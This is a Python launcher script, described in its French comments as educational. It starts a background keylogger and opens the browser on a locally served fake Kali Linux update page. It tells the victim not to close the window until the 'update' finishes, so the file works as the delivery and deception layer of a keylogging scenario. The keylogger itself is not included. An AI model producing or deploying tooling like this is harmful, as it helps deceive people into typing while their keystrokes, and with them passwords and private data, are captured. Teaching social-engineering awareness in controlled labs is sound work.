"""
Launcher pédagogique : démarre le keylogger et affiche la fausse mise à jour Kali.

Usage :
    python run_update.py

Ce script :
1. Lance keylogger.py en arrière-plan.
2. Démarre un serveur HTTP local pour servir fake_update/index.html.
3. Ouvre automatiquement le navigateur sur la page de mise à jour simulée.
"""

from __future__ import annotations

import http.server
import os
import socket
import socketserver
import subprocess
import sys
import threading
import time
import webbrowser
from pathlib import Path
from typing import Optional

BASE_DIR = Path(__file__).resolve().parent
FAKE_DIR = BASE_DIR / "fake_update"
KEYLOGGER = BASE_DIR / "keylogger.py"
HOST = "127.0.0.1"
DEFAULT_PORT = 8088


class SilentHandler(http.server.SimpleHTTPRequestHandler):
    """Handler HTTP sans logs verbeux."""

    def log_message(self, format: str, *args) -> None:  # noqa: A003 (format nom)
        return


def get_available_port(start_port: int) -> int:
    port = start_port
    while port < start_port + 20:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.bind((HOST, port))
                return port
            except OSError:
                port += 1
    raise RuntimeError("Impossible de trouver un port libre pour le serveur local.")


def start_static_server(directory: Path, port: int) -> socketserver.TCPServer:
    handler = lambda *args, **kwargs: SilentHandler(*args, directory=str(directory), **kwargs)  # noqa: E731
    httpd = socketserver.ThreadingTCPServer((HOST, port), handler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    return httpd


def start_keylogger() -> subprocess.Popen:
    if not KEYLOGGER.exists():
        raise FileNotFoundError(f"Keylogger introuvable : {KEYLOGGER}")
    env = os.environ.copy()
    cmd = [sys.executable, str(KEYLOGGER)]
    return subprocess.Popen(cmd, cwd=str(BASE_DIR), env=env)


def main() -> None:
    print("[+] Préparation de la mise à jour simulée…")
    port = get_available_port(DEFAULT_PORT)
    server = start_static_server(FAKE_DIR, port)
    print(f"[+] Serveur local démarré sur http://{HOST}:{port}")

    keylogger_process: Optional[subprocess.Popen] = None
    try:
        keylogger_process = start_keylogger()
        print(f"[+] Keylogger lancé (PID {keylogger_process.pid})")
        # Attendre un peu pour voir si le keylogger plante immédiatement
        time.sleep(2)
        if keylogger_process.poll() is not None:
            print("[-] ERREUR: Le keylogger s'est arrêté immédiatement!")
            print("[-] Vérifiez les erreurs ci-dessus.")
            print("[-] Solution probable: Utilisez Python 3.12 ou 3.11 au lieu de 3.13")
            server.shutdown()
            sys.exit(1)
    except Exception as exc:
        server.shutdown()
        raise exc

    url = f"http://{HOST}:{port}"
    time.sleep(0.5)
    print(f"[+] Ouverture du navigateur sur {url}")
    webbrowser.open(url, new=0, autoraise=True)

    print("[!] Ne pas fermer la fenêtre tant que la mise à jour n'est pas terminée.")
    print("[!] Ctrl+C pour arrêter le scénario.")
    try:
        while keylogger_process.poll() is None:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Arrêt utilisateur, nettoyage en cours…")
    finally:
        server.shutdown()
        if keylogger_process and keylogger_process.poll() is None:
            keylogger_process.terminate()
            try:
                keylogger_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                keylogger_process.kill()
        print("[+] Scénario arrêté.")


if __name__ == "__main__":
    main()

